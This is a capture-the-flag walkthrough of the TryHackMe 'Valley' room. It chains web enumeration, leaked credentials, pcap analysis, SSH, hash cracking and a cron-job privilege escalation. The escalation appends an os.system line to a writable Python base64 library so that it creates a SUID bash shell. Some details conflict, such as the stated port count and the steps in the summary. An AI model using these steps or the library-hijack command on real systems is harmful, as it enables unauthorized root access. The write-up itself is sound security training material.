# TryHackMe - Valley Room Writeup

## Overview

This is a detailed walkthrough of how I rooted the **Valley** room on TryHackMe and captured flags. The room involved realistic attack chain covering multiple skill areas ie, `Web Reconnaissance & Source Code Analysis`, `Non-Standard Port Enumeration`, `FTP Abuse with Leaked Credentials`, `Network Traffic Analysis (Wireshark)`, `SSH Lateral Movement`, `Linux Binary Analysis & Reversing` and `Privilege Escalation via Cron Jobs`.

---

## Recon :

I started the engagement with an `nmap` scan:

```bash
nmap -A -p- -sC -sV -T4 -oN initial_scan.txt <target-ip>
```

The scan revealed two open ports:

- **22** (SSH)
- **80** (HTTP)
- **37370** (FTP - TRACEROUTE (using port 443/tcp))

---

## Enumeration: Web Application Discovery

Accessing port 80 initially led nowhere. Nothing special there, It’s a photography company, i found two link in the website, one goes to gallery and The other goes to pricing. so the only thing left is file & directory fuzzing, let's do that  

```bash
gobuster dir -u http://<target-ip>/static/  -w /usr/share/seclists/Discovery/Web-Content/big.txt
```
i found `00   (Status: 200) [Size: 127]` intersting file, and checked it out and there was a notes left for dev and look like path `dev1243224123123`.
hitting the **http://<target-ip>/dev1243224123123/** url there was a login page and one of its source file ie `\dev.js` leaked the username and password.
after logging into the system leads to another notes, which was clue for getting into the system.

---

## Exploitation :

**Wireshark and foothold**

```bash
ftp <target-ip> -P 37370  
```
using the credentials found during enumeration i get into the system and there was `siemHTTP2.pcapng` file which i downloaded and observed the captured packets using wireshark and filtered the packet to http protocol only, agian looking to post method right and clicking on the packet i got credentials of user `valleyDev`.

```bash
ssh valleyDev@<target-ip>
```
here, i got my first flag.

**Privilege Escalation**

i found unusual binary on `/home` and tried to execute it `./valleyAuthenticator` i transfer it to my system and run strings on that file.

```bash
python3 -m http.server 8080
```
```bash
wget <target-ip>:8080/valleyAuthenticator
```
i found the part were the authentication works and there is a string that looks like an `md5 hash` ie `e6722920bab2326f8217e4bf6b1b58ac` and i cracked it since that file belongs to user `valley` and it was password for this user.

```bash
su valley
```
after switching to valley i then Checked the crontab file.There was a python script running every minute, i checked it.

```bash
id
cat /etc/crontab
cat /photos/script/photosEncrypt.py
```
The script was importing `base64 library`, which goes to `/photos` and opens every jpg file from p1.jpg to p7.jpg through a loop, encodes every file with base64 and write it to `/photos/photoVault`.

No any command was there to exploit in the script but then i remember one thing that if the file `base64 library` is writable then i can exploit it. and it was writable too.

```bash
find / -group valleyAdmin -type f 2>/dev/null 
find / -type f -name 'base64.py' -ls 2>/dev/null
```

i injected the following python script to it that would create a copy of bash with suid permission into `/tmp`.

```bash
echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' >> /usr/lib/python3.8/base64.py
```
And after a minute i get the bash shell.

```bash
ls -la /tmp/
/tmp/bash -p
cd /root 
```
finally, i got root flag too.

---

## Full Attack Chain

1. Port scan (nmap -p-) → 22 (SSH), 80 (HTTP), 37370 (FTP)
2. Browse HTTP on port 80 → Find JavaScript with credentials
3. Use those creds on FTP (port 37370) → Download .pcapng files
4. Open PCAPs in Wireshark → Follow TCP streams → Find another set of credentials
5. SSH with those creds → Get user flag
6. Find binary (valleyAuthenticator) → strings/UPX unpack → Extract password
7. Switch to valley user → Find cron job running Python script
8. Modify the script → Cron executes it as root → Get root flag

---

🖼️ **Find all screenshots here:** [`screenshots/valley/`](../screenshots/valley/)

## Summary & Learning Objectives

The Valley room on TryHackMe is a medium-difficulty boot-to-root challenge that takes us through a realistic attack chain covering multiple skill areas.

**Core Topics**
---------------

1. Web Reconnaissance & Source Code Analysis
    - Inspecting HTML/JavaScript source for hardcoded credentials
    - Finding hidden endpoints and developer notes

2. Non-Standard Port Enumeration
    - Discovering FTP running on an uncommon high port (37370)
    - Learning to scan all 65535 ports, not just the top 1000
    - Understanding that services can run on any port

3. FTP Abuse with Leaked Credentials
    - Connecting to FTP with credentials found on the web app
    - Downloading packet capture (PCAP) files for offline analysis

4. Network Traffic Analysis (Wireshark)
    - Analyzing PCAP files to find plaintext credentials in network traffic
    - Following TCP streams in captured HTTP and FTP sessions

5. SSH Lateral Movement
    - Using credentials found in packet captures to SSH into the target
    - Moving from a low-privilege FTP user to an SSH-accessible user

6. Linux Binary Analysis & Reversing
    - Finding and analyzing a binary (valleyAuthenticator)
    - Using strings to inspect the binary
    - Decompressing packed binaries with UPX (upx -d)
    - Extracting hardcoded credentials from reversed binaries

7. Privilege Escalation via Cron Jobs
    - Identifying a cron job running as root
    - Exploiting writable scripts executed by the cron job
    - Injecting code (e.g., Python reverse shell or file permission modification) to escalate to root


*Thanks for reading!*
